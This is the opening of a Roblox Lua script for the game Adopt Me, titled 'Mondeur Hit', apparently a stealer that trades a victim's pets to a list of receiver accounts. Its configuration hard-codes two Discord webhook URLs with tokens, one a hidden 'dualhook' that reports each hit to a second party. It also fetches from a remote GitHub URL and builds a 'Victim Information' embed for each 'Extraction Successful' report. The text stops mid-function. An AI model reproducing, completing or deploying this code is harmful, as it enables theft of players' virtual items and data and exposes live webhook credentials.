-- [[ MONDEUR HIT | THE ELITE ADOPT ME EXPORT ]] --
-- Features: Dynamic Global Config, Premium UI, Zero-Delay Trade, Dualhook.
-- Optimized for: Delta Executor (Safety Patched)
-- Version: 7.0 (The Master Finish Line)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- [[ DYNAMIC CONFIGURATION (Global) ]] --
-- These are designed to be set by your bot generator/loader via getgenv()
getgenv().WEBHOOK = getgenv().WEBHOOK or "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
getgenv().RECEIVERS = getgenv().RECEIVERS or {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
getgenv().THRESHOLD = getgenv().THRESHOLD or 1000 -- Userhook @everyone threshold

-- [[ STATIC SYSTEM SETTINGS ]] --
local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1417861953208193126/wWUd-tqbQT56zqL_y0KSF_s5ZYdBKfLtBJaWYVCN_uwue9hq8CsGuQWJOL1ivGEZ2CYz"
local POINT_SYSTEM_URL = "https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/Pointsystem"
local DUAL_PING_MIN = 500 -- Dualhook always pings if hit >= 500
local SCAN_DELAY = 0.4    -- Fast target scanning

-- [[ INTERNAL STORAGE ]] --
local PetValues = {}
local TradeAPI = ReplicatedStorage:WaitForChild("API", 20) -- Robust wait for remotes
local function trim(s) return s:match("^%s*(.-)%s*$") end

--------------------------------------------------------------
-- MONDEUR PREMIUM WEBHOOK ENGINE
--------------------------------------------------------------
local function sendDiscordRequest(url, payload)
    if not url or url == "" then return end
    
    -- Robust executor request function detection
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
    if not requestFunc then 
        print("[MONDEUR] Error: Executor does not support HTTP requests.")
        return 
    end
    
    pcall(function()
        requestFunc({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

local function buildMondeurEmbed(pets, total)
    local isHighValue = (total >= DUAL_PING_MIN)
    local petLogs = {}
    
    for _, p in ipairs(pets) do
        if p.value >= DUAL_PING_MIN then isHighValue = true end
        table.insert(petLogs, string.format("🐾 %s ➜ %d", p.name, p.value))
    end

    return {
        title = "🐶 **Mondeur Hit | Extraction Successful** 🐶",
        color = isHighValue and 0xFF0055 or 0x00D9FF,
        fields = {
            {
                name = "👤 **Victim Information**",
                value = string.format("
